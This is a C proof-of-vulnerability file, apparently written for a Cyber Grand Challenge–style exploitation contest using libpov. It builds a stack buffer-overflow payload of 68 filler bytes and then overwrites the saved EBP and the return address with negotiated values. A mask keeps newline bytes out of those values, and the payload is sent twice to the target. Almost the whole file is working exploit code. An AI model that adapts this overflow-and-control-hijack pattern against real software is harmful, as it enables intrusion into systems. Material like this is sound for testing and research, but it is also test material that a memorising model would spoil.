#include <libpov.h>

uint32_t hexStrToUint32(const char* str)
{
  int i = 0;
  uint32_t ret = 0;
  uint32_t temp = 0;
 
  for (i = 0; str[i] != '\0'; i++)
  {
    ret = ret << 4;
    if ( (str[i] >= '0') && (str[i] <= '9') ) 
    {
      temp = str[i] - '0';
    }
    else if ( (str[i] >= 'A') && (str[i] <= 'F') )
    {
      temp = str[i] - 'A' + 10;
    }
    else if ( (str[i] >= 'a') && (str[i] <= 'f') )
    {
      temp = str[i] - 'a' + 10;
    }
    else
    {
      return (0);
    }
    ret = ret | (temp & 0xF);
  } 

  return (ret);
}

uint32_t flipEndian(uint32_t t)
{
  uint32_t ret = 0;

  ret |= t & 0xFF;
  ret = ret << 8;
  ret |= (t >> 8) & 0xFF;
  ret = ret << 8;
  ret |= (t >> 16) & 0xFF;
  ret = ret << 8;
  ret |= (t >> 24) & 0xFF;

  return (ret);
}

int main(void)
{
  char buf[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC\n";

  unsigned int ipmask = 0xEEEEEEEE;
  unsigned int orMask = 0x11111111; //We use this mask because the read is delimited
                                    // so we will or the requested value with this
                                    // to ensure 0x0a doesn't exist
  unsigned int regmask = 0xEEEEEEEE;
  unsigned int regnum = 5;//ebp

  //68 is the offset
  
  type1_vals t1v;
  type1_negotiate(ipmask, regmask, regnum, &t1v);


  *((unsigned int*)(buf + 68)) = t1v.regval | orMask;
  *((unsigned int*)(buf + 72)) = t1v.ipval | orMask;

  transmit_all(STDOUT, buf, sizeof(buf));
  transmit_all(STDOUT, buf, sizeof(buf));

  return (0);
}

